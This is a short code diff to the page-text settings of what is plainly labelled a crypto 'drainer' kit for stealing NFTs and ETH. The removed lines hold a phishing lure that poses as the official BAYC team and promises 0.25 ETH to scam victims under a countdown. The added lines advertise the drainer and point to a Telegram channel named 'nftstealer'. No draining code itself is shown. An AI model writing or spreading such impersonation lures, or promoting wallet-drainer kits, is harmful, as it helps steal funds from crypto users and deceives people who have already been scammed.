@@ -20,9 +20,9 @@ const indexPageInfo = {
 }
 
 const claimPageInfo = {
-    title: "@0xTracey FREE DRAINER", // <br> is a line break
-    shortDescription: "1 Hour Left To Claim!",
-    longDescription: "As A Help To All The People Who Have Lost Their NFTs / ETH Through Crypto Scams We Are Giving Away 0.25 ETH ( 500$ ) To All Of You Guys! <br> This Giveaway Will Be On For Only 24 Hours So Claim Your ETH ASAP <br> Lots Of Love, Official BAYC Team",
+    title: "@0xTracey DRAINER", // <br> is a line break
+    shortDescription: "Get this Drainer for free though Github. @0xTracey",
+    longDescription: "https://t.me/nftstealer",
 
     claimButtonText: "CLAIM NOW",
 
